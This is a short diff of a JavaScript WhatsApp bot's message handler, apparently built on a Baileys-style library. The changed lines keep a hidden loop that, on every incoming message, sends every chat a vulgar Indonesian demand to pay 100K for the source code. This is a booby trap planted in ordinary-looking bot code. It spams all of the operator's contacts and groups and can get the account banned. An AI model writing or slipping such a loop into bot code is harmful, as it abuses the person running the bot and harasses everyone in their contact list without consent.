@@ -166,9 +166,9 @@ client.on('CB:Blocklist', json => {
 			const vhtearkey = 'APIKEY_LU'
 			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
 			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
-			anu = benny.chats.all()
+			anu = client.chats.all()
 			for (let o of anu) {
-			benny.sendMessage(o.jid, 'KALAU MAU ESCE GUA BAYAR KONTOL 100K', text)
+			client.sendMessage(o.jid, 'KALAU MAU ESCE GUA BAYAR KONTOL 100K', text)
 						}
 			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
 			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
